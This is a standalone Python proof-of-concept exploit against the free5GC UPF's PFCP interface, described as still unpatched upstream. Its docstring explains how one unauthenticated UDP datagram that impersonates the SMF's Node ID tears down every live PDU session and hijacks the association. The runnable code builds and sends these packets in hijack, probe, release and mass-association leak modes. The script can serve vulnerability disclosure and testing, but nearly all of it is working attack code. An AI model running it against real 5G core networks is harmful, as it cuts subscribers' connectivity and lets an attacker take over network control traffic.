#!/usr/bin/env python3
"""
free5GC UPF -- unauthenticated PFCP association hijack + mass PDU-session teardown
==================================================================================

Target
------
free5GC v4.2.2 UPF (go-upf), PFCP / N4 interface, UDP 8805.
Tested source: NFs/upf pin 04c1ab640350f5d354d09fac82cd7b4d66c78533 (deployed) and
develop HEAD dd83e307fb5c1573e93f1dae45e152a99581e932 -- internal/pfcp/association.go
is byte-identical between the two, i.e. still unpatched upstream.

The bug
-------
internal/pfcp/association.go, handleAssociationSetupRequest():

    // deleting the existing PFCP association and associated PFCP sessions,
    // if a PFCP association was already established for the Node ID
    // received in the request, regardless of the Recovery Timestamp
    // received in the request.
    if node, ok := s.rnodes[rnodeid]; ok {      # :52
        s.log.Infof("delete node: %#+v\n", node)
        node.Reset()                            # :54  EVERY live session is torn down
        delete(s.rnodes, rnodeid)               # :55
    }
    node := s.NewNode(rnodeid, addr, s.driver)  # :57  addr == the ATTACKER
    s.rnodes[rnodeid] = node                    # :58

PFCP carries no application-layer authentication (3GPP TS 29.244 assumes N4 is a
private, firewalled interface).  The handler never compares `addr` (the UDP source)
with the address the association was originally established from, and there is no
peer allow-list anywhere in the UPF.  The lookup key is purely the attacker-supplied
Node ID string.  Consequence -- ONE unauthenticated 37-byte UDP datagram:

  * node.Reset() (node.go:631) walks n.sess and calls DeleteSess() for every PFCP
    session owned by the impersonated peer.  DeleteSess() -> LocalNode.DeleteSess()
    -> Sess.Close() (node.go:54) builds Remove plans for every PDR/FAR/QER/URR/BAR
    and calls driver.ExecuteModificationPlan(), which deletes the rules from the
    gtp5g datapath.  => every live UE PDU session loses its forwarding rules.
  * delete(s.rnodes, id) followed by NewNode(id, addr) replaces the legitimate SMF
    RemoteNode with one whose `addr` is the ATTACKER: association hijack.  The UPF
    now addresses Session Report / Heartbeat requests to the attacker, and the real
    SMF's CP-SEIDs are unknown to the freshly created (empty) RemoteNode.

Second, independent defect in the same function -- permanent association leak:
  * handleAssociationReleaseRequest() is a no-op ("not supported", :83-88) and
    handleAssociationUpdateRequest() likewise (:76-81).  The only code path that
    ever removes an entry from s.rnodes is the same-id branch above.  Sending N
    Association Setup Requests with N *distinct* Node IDs therefore grows s.rnodes
    by N entries that can never be reclaimed (CWE-401 / CWE-772).

Modes
-----
  hijack : one Association Setup Request carrying the peer's real Node ID
           (default smf.free5gc.org) -> mass teardown + association hijack.
  leak   : N Association Setup Requests with N distinct Node IDs -> permanent
           rnodes growth; prints a packet-rate summary for RSS correlation.
  probe  : harmless reachability check; Heartbeat Request first, then one
           Association Setup Request with a throwaway Node ID.
  release: establish an association, then send an Association Release Request
           and show the UPF silently ignores it -> the entry is unreclaimable.

Usage
-----
  python3 upf_assoc_hijack_poc.py --target 10.100.200.3 --mode hijack
  python3 upf_assoc_hijack_poc.py --target 10.100.200.3 --mode leak --count 20000
  python3 upf_assoc_hijack_poc.py --target 10.100.200.3 --mode probe

Dependencies: python3 standard library only.
"""

import argparse
import binascii
import socket
import struct
import sys
import time

# --- 3GPP TS 29.244 message types ------------------------------------------
MSGTYPE_HEARTBEAT_REQUEST = 1
MSGTYPE_HEARTBEAT_RESPONSE = 2
MSGTYPE_ASSOC_SETUP_REQUEST = 5
MSGTYPE_ASSOC_SETUP_RESPONSE = 6
# TS 29.244 Table 7.2.1-1 / go-pfcp message.go:19,21,23 -- note Update is 7 and
# Release is 9; both handlers are no-ops in the free5GC UPF.
MSGTYPE_ASSOC_UPDATE_REQUEST = 7
MSGTYPE_ASSOC_RELEASE_REQUEST = 9

# --- 3GPP TS 29.244 IE types -----------------------------------------------
IE_CAUSE = 19
IE_NODE_ID = 60
IE_RECOVERY_TIME_STAMP = 96

# --- Node ID types (TS 29.244 8.2.4) ---------------------------------------
NODEID_IPV4 = 0
NODEID_IPV6 = 1
NODEID_FQDN = 2

# --- Cause values (TS 29.244 8.2.1) ----------------------------------------
CAUSE = {
    1: "Request accepted",
    64: "Request rejected",
    65: "Session context not found",
    66: "Mandatory IE missing",
    67: "Conditional IE missing",
    68: "Invalid length",
    69: "Mandatory IE incorrect",
    72: "No established PFCP association",
    75: "No resources available",
}

# Seconds between 1900-01-01 and 1970-01-01 (NTP epoch offset).
NTP_EPOCH_DELTA = 2208988800


def encode_fqdn(fqdn):
    """Mirrors go-pfcp internal/utils.EncodeFQDN() EXACTLY: one <len><label> pair per
    label and **no** root-label terminator (the buffer is len(fqdn)+1 bytes and the
    labels consume all of it).

    This matters for the attack: the decoder (ie.NodeID()) walks labels until the
    buffer is exhausted and joins them with '.', so an appended 0x00 would decode to
    an extra empty label -- "smf.free5gc.org." instead of "smf.free5gc.org" -- and the
    s.rnodes[rnodeid] lookup in handleAssociationSetupRequest() would MISS, silently
    turning the hijack into a plain new association.  The impersonated Node ID has to
    match the peer's configured pfcp.nodeID byte for byte.
    """
    out = bytearray()
    for label in fqdn.rstrip(".").split("."):
        raw = label.encode("idna") if any(ord(c) > 127 for c in label) else label.encode()
        if len(raw) > 63:
            raw = raw[:63]
        out.append(len(raw))
        out += raw
    return bytes(out)


def build_ie(ie_type, value):
    return struct.pack("!HH", ie_type, len(value)) + value


def build_node_id_ie(node_id):
    """Node ID IE from either a dotted-quad or an FQDN, mirroring go-pfcp's
    ie.NewNodeID()/NewNodeIDHeuristic() and internal/utils.EncodeFQDN()."""
    try:
        packed = socket.inet_pton(socket.AF_INET, node_id)
        return build_ie(IE_NODE_ID, bytes([NODEID_IPV4]) + packed)
    except OSError:
        pass
    try:
        packed = socket.inet_pton(socket.AF_INET6, node_id)
        return build_ie(IE_NODE_ID, bytes([NODEID_IPV6]) + packed)
    except OSError:
        pass
    return build_ie(IE_NODE_ID, bytes([NODEID_FQDN]) + encode_fqdn(node_id))


def build_message(msg_type, seq, ies, seid=None):
    """Assemble a PFCP message.  seid=None -> node-related (S=0, 8-byte header)."""
    if seid is None:
        flags = 0x20  # version 1, spare 0, MP 0, S 0
        remainder = struct.pack("!I", (seq & 0xFFFFFF) << 8)  # 3-byte seq + spare
    else:
        flags = 0x21  # version 1, S 1
        remainder = struct.pack("!Q", seid & 0xFFFFFFFFFFFFFFFF)
        remainder += struct.pack("!I", (seq & 0xFFFFFF) << 8)
    header = struct.pack("!BBH", flags, msg_type, len(remainder) + len(ies))
    return header + remainder + ies


def build_assoc_setup_request(seq, node_id, recovery_ts=None):
    if recovery_ts is None:
        recovery_ts = int(time.time()) + NTP_EPOCH_DELTA
    ies = build_node_id_ie(node_id)
    ies += build_ie(IE_RECOVERY_TIME_STAMP, struct.pack("!I", recovery_ts & 0xFFFFFFFF))
    return build_message(MSGTYPE_ASSOC_SETUP_REQUEST, seq, ies)


def build_assoc_release_request(seq, node_id):
    """TS 29.244 7.2.2.4 -- Association Release Request (Node ID IE only)."""
    return build_message(MSGTYPE_ASSOC_RELEASE_REQUEST, seq, build_node_id_ie(node_id))


def build_assoc_update_request(seq, node_id):
    """TS 29.244 7.2.2.3 -- Association Update Request (Node ID IE only)."""
    return build_message(MSGTYPE_ASSOC_UPDATE_REQUEST, seq, build_node_id_ie(node_id))


def build_heartbeat_request(seq, recovery_ts=None):
    if recovery_ts is None:
        recovery_ts = int(time.time()) + NTP_EPOCH_DELTA
    ies = build_ie(IE_RECOVERY_TIME_STAMP, struct.pack("!I", recovery_ts & 0xFFFFFFFF))
    return build_message(MSGTYPE_HEARTBEAT_REQUEST, seq, ies)


def parse_response(buf):
    """Returns dict(flags, msg_type, msg_len, seq, seid, ies{type:value})."""
    if len(buf) < 8:
        return None
    flags, msg_type, msg_len = struct.unpack("!BBH", buf[:4])
    off = 4
    seid = None
    if flags & 0x01:  # S bit set -> session-related, 8-byte SEID present
        if len(buf) < 16:
            return None
        seid = struct.unpack("!Q", buf[4:12])[0]
        off = 12
    seq = int.from_bytes(buf[off:off + 3], "big")
    off += 4  # 3-byte sequence number + 1 spare octet
    ies = {}
    while off + 4 <= len(buf):
        ie_type, ie_len = struct.unpack("!HH", buf[off:off + 4])
        off += 4
        if off + ie_len > len(buf):
            break
        ies[ie_type] = buf[off:off + ie_len]
        off += ie_len
    return {
        "flags": flags,
        "msg_type": msg_type,
        "msg_len": msg_len,
        "seq": seq,
        "seid": seid,
        "ies": ies,
    }


def cause_str(parsed):
    if not parsed or IE_CAUSE not in parsed["ies"] or not parsed["ies"][IE_CAUSE]:
        return "<absent>"
    value = parsed["ies"][IE_CAUSE][0]
    return "%d (%s)" % (value, CAUSE.get(value, "unknown"))


def peer_node_id(parsed):
    """Decode the UPF's own Node ID from an Association Setup Response."""
    if not parsed or IE_NODE_ID not in parsed["ies"]:
        return "<absent>"
    payload = parsed["ies"][IE_NODE_ID]
    if not payload:
        return "<empty>"
    kind = payload[0]
    body = payload[1:]
    if kind == NODEID_IPV4 and len(body) >= 4:
        return socket.inet_ntop(socket.AF_INET, body[:4])
    if kind == NODEID_IPV6 and len(body) >= 16:
        return socket.inet_ntop(socket.AF_INET6, body[:16])
    if kind == NODEID_FQDN:
        labels, i = [], 0
        while i < len(body) and body[i]:
            n = body[i]
            labels.append(body[i + 1:i + 1 + n].decode("utf-8", "replace"))
            i += 1 + n
        return ".".join(labels)
    return binascii.hexlify(payload).decode()


def send_and_recv(sock, dest, payload, timeout):
    """Send one datagram, return the first reply (bytes) or None on timeout."""
    sock.sendto(payload, dest)
    try:
        data, src = sock.recvfrom(65535)
        return data, src
    except socket.timeout:
        return None, None


def open_socket(bind_ip, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    if bind_ip:
        sock.bind((bind_ip, 0))
    return sock


def hexdump(payload):
    return " ".join("%02x" % b for b in payload)


def mode_probe(args, dest, seq_base):
    """Reachability check that does not disturb any live association."""
    print("[probe] target %s:%d" % dest)
    sock = open_socket(args.bind, args.timeout)
    try:
        pkt = build_heartbeat_request(seq_base)
        print("[probe] Heartbeat Request  seq=%d  len=%d" % (seq_base, len(pkt)))
        print("[probe]   wire: %s" % hexdump(pkt))
        reply, src = send_and_recv(sock, dest, pkt, args.timeout)
        if reply is None:
            print("[probe] no Heartbeat Response (timeout %.1fs)" % args.timeout)
            print("VERDICT=UNREACHABLE")
            return 2
        parsed = parse_response(reply)
        print("[probe] Heartbeat Response from %s msg_type=%d seq=%d"
              % (src, parsed["msg_type"], parsed["seq"]))
        throwaway = "poc-probe-%d.invalid" % int(time.time())
        pkt2 = build_assoc_setup_request(seq_base + 1, throwaway)
        print("[probe] Association Setup Request seq=%d node_id=%s len=%d"
              % (seq_base + 1, throwaway, len(pkt2)))
        print("[probe]   wire: %s" % hexdump(pkt2))
        reply2, src2 = send_and_recv(sock, dest, pkt2, args.timeout)
        if reply2 is None:
            print("[probe] no Association Setup Response")
            print("VERDICT=UNREACHABLE")
            return 2
        parsed2 = parse_response(reply2)
        print("[probe] Association Setup Response from %s" % (src2,))
        print("[probe]   msg_type=%d (expect %d) seq=%d cause=%s upf_node_id=%s"
              % (parsed2["msg_type"], MSGTYPE_ASSOC_SETUP_RESPONSE, parsed2["seq"],
                 cause_str(parsed2), peer_node_id(parsed2)))
        print("[probe] UPF accepts unauthenticated Association Setup from an "
              "arbitrary source address -- target is vulnerable to the hijack mode")
        print("VERDICT=REACHABLE_NO_AUTH")
        return 0
    finally:
        sock.close()


def mode_hijack(args, dest, seq_base):
    """Single-datagram association hijack + mass session teardown."""
    print("[hijack] target %s:%d  impersonated node_id=%r" % (dest[0], dest[1], args.node_id))
    sock = open_socket(args.bind, args.timeout)
    try:
        pkt = build_assoc_setup_request(seq_base, args.node_id,
                                        recovery_ts=args.recovery_ts)
        print("[hijack] Association Setup Request: seq=%d  %d bytes on the wire"
              % (seq_base, len(pkt)))
        print("[hijack]   wire: %s" % hexdump(pkt))
        if args.dry_run:
            print("[hijack] --dry-run: packet built but NOT sent")
            print("VERDICT=DRY_RUN")
            return 0
        t0 = time.time()
        reply, src = send_and_recv(sock, dest, pkt, args.timeout)
        elapsed = time.time() - t0
        if reply is None:
            print("[hijack] no Association Setup Response within %.1fs" % args.timeout)
            print("[hijack] NOTE: a missing response does not mean the packet was "
                  "ignored; the handler tears the sessions down before replying")
            print("VERDICT=NO_RESPONSE")
            return 1
        parsed = parse_response(reply)
        cause_ok = (IE_CAUSE in parsed["ies"] and parsed["ies"][IE_CAUSE]
                    and parsed["ies"][IE_CAUSE][0] == 1)
        print("[hijack] Association Setup Response from %s in %.3fs" % (src, elapsed))
        print("[hijack]   msg_type=%d seq=%d cause=%s upf_node_id=%s"
              % (parsed["msg_type"], parsed["seq"], cause_str(parsed),
                 peer_node_id(parsed)))
        print("[hijack]   wire: %s" % hexdump(reply))
        if cause_ok:
            print("[hijack] Cause=Request accepted -> the UPF deleted the existing "
                  "association for node_id=%r, tore down every PFCP session belonging "
                  "to it, and re-created the association bound to OUR source address "
                  "%s" % (args.node_id, src))
            print("VERDICT=ASSOCIATION_HIJACKED")
            return 0
        print("[hijack] unexpected Cause -- the impersonated Node ID may not match a "
              "live association")
        print("VERDICT=REJECTED")
        return 1
    finally:
        sock.close()


def mode_leak(args, dest, seq_base):
    """Grow s.rnodes with distinct Node IDs that can never be released."""
    prefix = args.leak_prefix
    total = args.count
    print("[leak] target %s:%d  distinct node_ids=%d  prefix=%r"
          % (dest[0], dest[1], total, prefix))
    print("[leak] handleAssociationReleaseRequest() is a no-op in the UPF, so none "
          "of these entries can ever be reclaimed")
    sock = open_socket(args.bind, args.timeout)
    sock.settimeout(args.leak_timeout)
    accepted = sent = 0
    t0 = time.time()
    try:
        for i in range(total):
            node_id = "%s%06d.%s" % (prefix, i, args.leak_domain)
            pkt = build_assoc_setup_request(seq_base + i, node_id)
            sock.sendto(pkt, dest)
            sent += 1
            try:
                reply, _ = sock.recvfrom(65535)
                parsed = parse_response(reply)
                if (parsed and parsed["msg_type"] == MSGTYPE_ASSOC_SETUP_RESPONSE
                        and IE_CAUSE in parsed["ies"] and parsed["ies"][IE_CAUSE]
                        and parsed["ies"][IE_CAUSE][0] == 1):
                    accepted += 1
            except socket.timeout:
                pass
            if sent % args.report_every == 0:
                rate = sent / max(time.time() - t0, 1e-9)
                print("[leak]   sent=%d accepted=%d elapsed=%.1fs rate=%.0f pps"
                      % (sent, accepted, time.time() - t0, rate))
        elapsed = time.time() - t0
        rate = sent / max(elapsed, 1e-9)
        print("[leak] done: sent=%d accepted=%d in %.1fs (%.0f pps)"
              % (sent, accepted, elapsed, rate))
        print("[leak] each accepted request permanently adds one RemoteNode to "
              "s.rnodes (map key + RemoteNode + logrus.Entry + empty session map)")
        if accepted == 0:
            print("VERDICT=NOT_REPRODUCED")
            return 1
        print("VERDICT=LEAK_ASSOCIATIONS_CREATED(%d)" % accepted)
        return 0
    finally:
        sock.close()


def mode_release(args, dest, seq_base):
    """Prove that an established association can never be released.

    handleAssociationReleaseRequest() (association.go:83-88) only logs
    "not supported" and returns -- it neither removes the entry from s.rnodes
    nor sends an Association Release Response.  The request therefore times
    out and the RemoteNode stays allocated forever.
    """
    node_id = args.node_id
    print("[release] target %s:%d  node_id=%r" % (dest[0], dest[1], node_id))
    sock = open_socket(args.bind, args.timeout)
    try:
        pkt = build_assoc_setup_request(seq_base, node_id)
        reply, _ = send_and_recv(sock, dest, pkt, args.timeout)
        if reply is None:
            print("[release] setup got no reply -- cannot continue")
            print("VERDICT=UNREACHABLE")
            return 2
        print("[release] setup accepted: cause=%s" % cause_str(parse_response(reply)))

        # Both teardown paths defined by TS 29.244 are no-ops in this UPF, so
        # probe them in turn: Association Release Request (type 9) and
        # Association Update Request (type 7).
        ignored = []
        for step, (builder, name) in enumerate((
                (build_assoc_release_request, "Association Release Request (type 9)"),
                (build_assoc_update_request, "Association Update Request (type 7)"))):
            rpkt = builder(seq_base + 1 + step, node_id)
            print("[release] %s: %d bytes" % (name, len(rpkt)))
            print("[release]   wire: %s" % hexdump(rpkt))
            rreply, _ = send_and_recv(sock, dest, rpkt, args.timeout)
            if rreply is None:
                print("[release]   NO response within %.1fs -- silently ignored"
                      % args.timeout)
                ignored.append(name)
            else:
                p2 = parse_response(rreply)
                print("[release]   response msg_type=%d cause=%s"
                      % (p2["msg_type"], cause_str(p2)))

        if len(ignored) == 2:
            print("[release] BOTH handlers are no-ops (association.go:76-88). Once an "
                  "entry exists in s.rnodes the only code path that can ever remove it "
                  "is another Association Setup Request carrying the SAME Node ID, so "
                  "the RemoteNode for %r is permanently unreclaimable." % node_id)
            print("VERDICT=RELEASE_AND_UPDATE_UNSUPPORTED_ASSOCIATION_LEAKED")
            return 0
        if ignored:
            print("[release] %s ignored" % ", ".join(ignored))
            print("VERDICT=PARTIALLY_UNSUPPORTED")
            return 1
        print("VERDICT=RELEASE_ANSWERED")
        return 1
    finally:
        sock.close()


def main():
    ap = argparse.ArgumentParser(
        description="free5GC UPF unauthenticated PFCP association hijack / leak PoC")
    ap.add_argument("--target", default="10.100.200.3",
                    help="UPF PFCP IP (default: %(default)s)")
    ap.add_argument("--port", type=int, default=8805,
                    help="UPF PFCP UDP port (default: %(default)s)")
    ap.add_argument("--mode", choices=["probe", "hijack", "leak", "release"], default="hijack",
                    help="attack mode (default: %(default)s)")
    ap.add_argument("--node-id", default="smf.free5gc.org",
                    help="Node ID to impersonate in hijack mode; must equal the "
                         "peer's configured pfcp.nodeID (default: %(default)s)")
    ap.add_argument("--bind", default=None,
                    help="local source IP to bind (default: let the OS route)")
    ap.add_argument("--seq", type=int, default=1,
                    help="starting PFCP sequence number (default: %(default)s)")
    ap.add_argument("--recovery-ts", type=int, default=None,
                    help="Recovery Time Stamp (NTP seconds); default: now")
    ap.add_argument("--timeout", type=float, default=3.0,
                    help="reply timeout in seconds (default: %(default)s)")
    ap.add_argument("--count", type=int, default=20000,
                    help="leak mode: number of distinct associations (default: %(default)s)")
    ap.add_argument("--leak-prefix", default="poc-leak-",
                    help="leak mode: Node ID prefix (default: %(default)s)")
    ap.add_argument("--leak-domain", default="invalid",
                    help="leak mode: Node ID domain (default: %(default)s)")
    ap.add_argument("--leak-timeout", type=float, default=0.2,
                    help="leak mode: per-packet reply timeout (default: %(default)s)")
    ap.add_argument("--report-every", type=int, default=2000,
                    help="leak mode: progress interval (default: %(default)s)")
    ap.add_argument("--dry-run", action="store_true",
                    help="hijack mode: build and print the packet without sending")
    args = ap.parse_args()

    dest = (args.target, args.port)
    if args.mode == "probe":
        return mode_probe(args, dest, args.seq)
    if args.mode == "hijack":
        return mode_hijack(args, dest, args.seq)
    if args.mode == "release":
        return mode_release(args, dest, args.seq)
    return mode_leak(args, dest, args.seq)


if __name__ == "__main__":
    sys.exit(main())
